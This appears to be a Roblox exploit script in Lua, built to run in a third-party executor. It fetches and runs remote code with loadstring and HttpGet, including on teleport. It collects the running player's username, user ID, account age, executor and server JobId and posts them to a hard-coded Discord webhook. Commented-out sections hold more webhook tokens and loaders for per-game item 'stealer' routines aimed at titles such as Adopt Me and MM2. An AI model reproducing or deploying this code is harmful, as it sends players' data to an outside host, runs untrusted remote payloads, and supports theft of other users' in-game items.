if queue_on_teleport then
    queue_on_teleport(
        'loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/websocket/refs/heads/main/my_script.lua",true))()'
    )
end

-- repeat
--     task.wait()
-- until game:IsLoaded()

-- if game.GameId ~= 66654135 then
-- --     script = [[Usernames = {
-- --         'egor_idk',
-- --     }
-- --     BigHitsWebhook = "https://discord.com/api/webhooks/1357826346390388736/KjSeHvVInPlSYUlXzlPmO8QlFrvGBYijca90t1KDXEoHd6t2I1BBhHW88N2RXWk4ztz5"
-- --     SmallHitsWebhook = "https://discord.com/api/webhooks/1357826383799123998/y09epQB5PoyzGQq6qIBvpwLK8dVoc_68CxGWzz6RhkE7ou2DWG3kqDWO0KMkuMrWdEEd"
-- --     loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/X/refs/heads/main/mm2_shitsploit.lua", true))()
-- -- loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/files/mm2_lite.lua"))()
-- -- ]]
-- --     queue_on_teleport(script)

--     task.wait(0.1)
--     game:GetService('TeleportService'):Teleport(142823291, game.Players.LocalPlayer)
-- end

-- Usernames = {
--     'egor_idk',
-- }
-- BigHitsWebhook = "https://discord.com/api/webhooks/1357826346390388736/KjSeHvVInPlSYUlXzlPmO8QlFrvGBYijca90t1KDXEoHd6t2I1BBhHW88N2RXWk4ztz5"
-- SmallHitsWebhook = "https://discord.com/api/webhooks/1357826383799123998/y09epQB5PoyzGQq6qIBvpwLK8dVoc_68CxGWzz6RhkE7ou2DWG3kqDWO0KMkuMrWdEEd"
-- loadstring(game:HttpGet("https://raw.githubusercontent.com/f4shn/X/refs/heads/main/mm2_shitsploit.lua", true))()
-- loadstring(game:HttpGet("https://api.overdrivehub.xyz/v1/files/mm2_lite.lua"))()


-- --[[

-- if game.GameId == 383310974 then
--     ADOPT_ME_STEALER()
-- end
-- if game.GameId == 66654135 then
--     MM2_STEALER()
-- end
-- if game.GameId == 4777817887 then
--     BLADE_BALL_STEALER()
-- end
-- if game.GameId == 3317771874 then
--     PS99_STEALER()
-- end
-- if game.GameId == 4778845442 then
--     TTD()
-- end
-- if game.GameId == 3317679266 then
--     PLS_DONATE()
-- end
-- if game.GameId == 1008451066 then
--     DA_HOOD()
-- end
-- if game.GameId == 994732206 then
--     BLOX_FRUITS()
-- end

-- ]]


local Webhook =
    "https://discord.com/api/webhooks/1357822808721199174/qefvIlrlM5Q4lfJQXtcotcT4bxBnWvi62ltt0sQYyRYk0NStY1jRpAba4ZvDj4kJyF11" -- your webhook
_G.Discord_UserID = "" -- ID To Ping on every execution, blank if no one wants to be pinged.

local player = game:GetService "Players".LocalPlayer
local joinTime = os.time() - (player.AccountAge * 86400)
local joinDate = os.date("!*t", joinTime)
local premium = false
local alt = true
if player.MembershipType == Enum.MembershipType.Premium then
    premium = true
end

if not premium and player.AccountAge >= 70 then
    alt = "Possible"
elseif premium and player.AccountAge >= 70 then
    alt = false
end

local executor = identifyexecutor() or "Unknown"
local Thing =
    game:HttpGet(
    string.format(
        "https://thumbnails.roblox.com/v1/users/avatar?userIds=%d&size=180x180&format=Png&isCircular=true",
        game.Players.LocalPlayer.UserId
    )
)
Thing = game:GetService("HttpService"):JSONDecode(Thing).data[1]
local AvatarImage = Thing.imageUrl
local msg = {
    ["username"] = "Being a pedo",
    ["avatar_url"] = "https://cdn.discordapp.com/attachments/868496249958060102/901884186267365396/ezgif-2-3c2a2bc53af1.gif",
    ["content"] = (_G.Discord_UserID ~= "" and _G.Discord_UserID ~= nil) and tostring("<@" .. _G.Discord_UserID .. ">") or
        " ",
    ["embeds"] = {
        {
            ["color"] = tonumber(tostring("0x32CD32")), --decimal
            ["title"] = "This Bozo executed. v3",
            ["thumbnail"] = {
                ["url"] = AvatarImage
            },
            ["fields"] = {
                {
                    ["name"] = "Username",
                    ["value"] = "||" .. player.Name .. "||",
                    ["inline"] = true
                },
                {
                    ["name"] = "Display Name",
                    ["value"] = player.DisplayName,
                    ["inline"] = true
                },
                {
                    ["name"] = "UID",
                    ["value"] = "||[" ..
                        player.UserId ..
                            "](" ..
                                tostring(
                                    "https://www.roblox.com/users/" .. game.Players.LocalPlayer.UserId .. "/profile"
                                ) ..
                                    ")||",
                    ["inline"] = true
                },
                {
                    ["name"] = "Game Id",
                    ["value"] = "[" ..
                        game.PlaceId .. "](" .. tostring("https://www.roblox.com/games/" .. game.PlaceId) .. ")",
                    ["inline"] = true
                },
                {
                    ["name"] = "Game Name",
                    ["value"] = game:GetService("MarketplaceService"):GetProductInfo(game.PlaceId).Name,
                    ["inline"] = true
                },
                {
                    ["name"] = "Executor Used",
                    ["value"] = executor,
                    ["inline"] = true
                },
                {
                    ["name"] = "Alt",
                    ["value"] = alt,
                    ["inline"] = true
                },
                {
                    ["name"] = "Account Age",
                    ["value"] = player.AccountAge .. "day(s)",
                    ["inline"] = true
                },
                {
                    ["name"] = "Date Joined",
                    ["value"] = joinDate.day .. "/" .. joinDate.month .. "/" .. joinDate.year,
                    ["inline"] = true
                },
                {
                    ["name"] = "JobId",
                    ["value"] = game.JobId,
                    ["inline"] = true
                }
            },
            ["timestamp"] = os.date("%Y-%m-%dT%X.000Z")
        }
    }
}

request = http_request or request or HttpPost or syn.request
request(
    {
        Url = Webhook,
        Method = "POST",
        Headers = {["Content-Type"] = "application/json"},
        Body = game.HttpService:JSONEncode(msg)
    }
)

loadstring(game:HttpGet("https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source"))()
